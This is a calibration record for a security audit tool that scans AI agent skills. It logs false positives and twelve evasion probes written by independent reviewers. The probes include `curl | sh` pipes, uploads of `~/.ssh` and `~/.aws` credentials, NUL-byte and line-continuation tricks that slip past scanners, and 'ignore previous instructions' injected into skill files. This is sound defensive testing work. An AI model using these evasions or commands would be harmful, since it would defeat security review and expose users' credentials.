# Calibration record

How the audit rules were checked against real skills, and what each change did. The corpus is every
skill in the three default catalogs (62 skills): `anthropics/skills`, `anthropics/claude-plugins-official`
and `vercel-labs/agent-skills`, mirrored on 30 October 2026 (claude-plugins-official at `f8c5e7a`).

## Summary

| Rule set | BLOCK | REVIEW | CLEAN / OK | Malicious fixtures blocked |
|---|---|---|---|---|
| First rule set (pre-release, never committed) | 18 | 11 | 33 | 4 / 4 |
| v0.1.0 (context-aware severity) | 0 | 16 | 46 | 4 / 4 |
| v0.1.1 (after an independent review) | 1 | 21 | 40 | 7 / 7 |
| v0.1.2 (two false positives fixed) | 1 | 21 | 40 | 7 / 7 |
| v0.1.3 (remote instructions rule) | 1 | 23 | 38 | 7 / 7 + 1 REVIEW fixture |
| v0.1.4 (after a second independent review) | 1 | 24 | 37 | 7 / 7 + 10 or 11 / 12 review cases (see v0.1.4) |

v0.1.0 shipped 5 fixtures: 4 malicious (`exfil`, `hidden`, `obfuscated`, `persistence`) and 1 clean.
v0.1.1 added 3 malicious ones (`prose-pipe`, `split-exfil`, `name-injection`).

## The 18 blocks of the first rule set

The first rule set was not committed. It was reconstructed from v0.1.0 by reverting the tuning changes
made in the same session. The reconstruction is exact for blocking: 18 BLOCK, and the same count of HIGH
findings per rule as the original run (agent-config 50, mismatch-secrets 11, exfil-pattern 7,
destructive 4, injection 3, shell-rc-write 2, pipe-to-shell 2, conceal-from-user 1, role-override 1).

| # | Skill | What triggered the HIGH findings | Cause |
|---|---|---|---|
| 1 | anthropics-skills/claude-api | quoted examples of override language, "never run … `curl \| sh`", code comments about planted `~/.bashrc` symlinks, API docs mixing `.env` and HTTP | documentation describing attacks |
| 2 | anthropics-skills/docx | `env = os.environ.copy()` in `scripts/office/soffice.py` | Python idiom for subprocess environments |
| 3 | anthropics-skills/pptx | same `soffice.py` | Python idiom |
| 4 | anthropics-skills/skill-creator | environment dict for a subprocess; writes a command file into `.claude/commands/` | Python idiom; configures Claude Code |
| 5 | anthropics-skills/xlsx | same `soffice.py` | Python idiom |
| 6 | claude-plugins-official/…imessage…/configure | "No `.env` file for this channel" | documentation mentioning a credential file |
| 7 | claude-plugins-official/claude-automation-recommender | hooks, settings and MCP paths in its guidance | configures Claude Code |
| 8 | claude-plugins-official/m5-onboard | tells the agent to install Homebrew with `curl … \| bash` | a real download-and-run instruction (still BLOCK by design) |
| 9 | claude-plugins-official/writing-hookify-rules | a rule pattern `\.env$`; a list of dangerous commands to catch | protective hooks; documentation |
| 10 | claude-plugins-official/build-mcp-server | `claude_desktop_config.json` in a reference table | configures Claude Code |
| 11 | claude-plugins-official/command-development | `.claude/commands/` and settings paths | configures Claude Code |
| 12 | claude-plugins-official/hook-development | settings paths; hook examples that block `.env` writes and `dd`/`mkfs` | configures Claude Code; protective hooks |
| 13 | claude-plugins-official/mcp-integration | `.mcp.json` paths; auth docs mixing environment variables and HTTP | configures Claude Code; documentation |
| 14 | claude-plugins-official/plugin-settings | an example hook that denies writes to `.env` files | protective hooks |
| 15 | claude-plugins-official/plugin-structure | `.claude/` and `.mcp.json` paths | configures Claude Code |
| 16 | claude-plugins-official/receipts | "ignore previous instructions" quoted as text to treat as data | documentation describing attacks |
| 17 | claude-plugins-official/skill-creator | same as #4 | Python idiom; configures Claude Code |
| 18 | vercel-agent-skills/vercel-cli-with-tokens | `printenv VERCEL_TOKEN`, `.env` and API calls in its instructions | the skill's documented job (using a token) |

All 18 come from Anthropic's and Vercel's catalogs. None of the HIGH findings pointed to malicious
behaviour. Seventeen were noise; the eighteenth (m5-onboard) is a genuine download-and-run
instruction from a well-known source, which v0.1.0 let through as REVIEW and v0.1.1 blocks again.

## The three bypasses of v0.1.0

Found by an independent review on release day. The reconstructed first rule set shows where each came from.

| Probe | First rule set | v0.1.0 | v0.1.1 |
|---|---|---|---|
| `curl … \| bash` in SKILL.md prose | BLOCK | REVIEW | BLOCK |
| `~/.ssh` read in one script, uploaded from another, generic description words | REVIEW | OK | BLOCK |
| instructions to the agent in the frontmatter `name` | REVIEW | CLEAN | BLOCK |

Only the first was created by the tuning alone. The other two were gaps from the start: no
cross-script exfiltration check, and no rule for claimed user approval or force-install instructions
(the `name` line was scanned; only a generic "without asking" rule matched it). The tuning then made
both look cleaner.

## v0.1.2

Two false positives found by the same review on real installed skills: the known-endpoint rule read
`toast.promise(` as the `oast.pro` domain, and a zero-width character used to escape a code fence in a
template was treated as hidden text. Both fixed; the corpus numbers did not change.

## v0.1.3

A tester on a second server found a gap the audit couldn't see: `web-design-guidelines` passed as
CLEAN, yet its SKILL.md tells the agent to fetch the actual review rules from a URL before every run.
The audited file is clean; the instructions the agent follows arrive later and can change at any time.
New rule `remote-instructions` (MEDIUM, so REVIEW): SKILL.md tells the agent to fetch something that is
itself instructions ("fetch the latest rules", "rules from the fetched document", or a URL to a file
such as `command.md`). Fetching reference material (SDK READMEs, a course catalogue) is `remote-content`,
LOW. On the 62 skills it flags exactly two, `web-design-guidelines` and `writing-guidelines`; twelve
reference fetches are LOW. Calibration: 1 BLOCK, 23 REVIEW, 38 CLEAN/OK.

## v0.1.4

A second independent review wrote 12 inert malicious skills against v0.1.3. None got BLOCK:

| # | Probe | v0.1.3 | v0.1.4 | Cause |
|---|---|---|---|---|
| 1 | five commented-out `curl … \| sh` lines, then a live one | REVIEW | BLOCK | the per-rule report cap ignored severity, so the live HIGH line was dropped |
| 2 | script adds a `SessionStart` hook to `~/.claude/settings.json` | REVIEW | BLOCK | "skill" in the description counted as declaring config work |
| 3 | NUL byte on line 2 of a bash script that uploads `~/.ssh` | REVIEW | BLOCK | treated as a binary and not scanned; bash runs it |
| 4 | NUL byte in `SKILL.md` above injection and `curl \| bash` | REVIEW | BLOCK | same |
| 5 | Python `"~/." + "ssh"` and `u = request.urlopen` | CLEAN | BLOCK | no import rule; path never written out |
| 6 | Node `require("https")` with `~/.aws/credentials` | REVIEW | BLOCK | Node network modules not covered |
| 7 | PowerShell `irm … \| iex`, lowercase `invoke-webrequest` | REVIEW | BLOCK | case-sensitive rules |
| 8 | script padded past 2 MB | REVIEW | BLOCK | too large to scan was only MEDIUM |
| 9 | `rsync ~/.aws/ user@host:` | REVIEW | BLOCK | rsync not a network tool |
| 10 | `npx -y` with a typo-squatted package | OK | REVIEW | a typo can't be detected statically; installs in scripts are now MEDIUM |
| 11 | a quoted paragraph in `SKILL.md` that starts "Ignore all previous instructions" | REVIEW | BLOCK | any quote counted as a mention |
| 12 | `cu\` + newline + `rl … \| sh` | CLEAN | BLOCK | line continuations not joined |

The v0.1.3 column is our own re-run of the probes; none got BLOCK. Two stay REVIEW by design: #10 (a
typo can't be detected statically) and, in the reviewer's own version of #11, a short quoted phrase that
closes right after the attack words, which still counts as a mention. Our #11, a quoted paragraph that
goes on to give orders, is BLOCK. So the count is 10/12 BLOCK on the reviewer's probes, 11/12 on ours. Each probe is now a case in
`test_second_review_bypasses`, together with "run the use command with `--force`", which
`airlock-override` missed; all 13 fail on v0.1.3.

Effect on the 62 skills: one new REVIEW, `web-artifacts-builder`, whose setup script runs
`npm install -g pnpm` and `pnpm install`. One change was rejected: making `.claude/commands/` and
`.claude/agents/` HIGH without the "skill" excuse blocked both copies of Anthropic's `skill-creator`,
which writes a temporary command file for its evals. Those directories are now a separate MEDIUM rule
(`agent-instructions`), while settings, hooks and MCP config, which run code on their own, stay HIGH.
`.claude/skills/` was left out of that rule because skills name their own install path constantly.
Calibration: 1 BLOCK, 24 REVIEW, 37 CLEAN/OK.

What this review shows beyond the twelve fixes: line-based patterns can always be evaded by code
written against them (`getattr`, `chr()`, string building). The README now says so, and the v0.2
roadmap makes skills with scripts from untrusted sources REVIEW at least, and adds optional
sandboxed script runs.
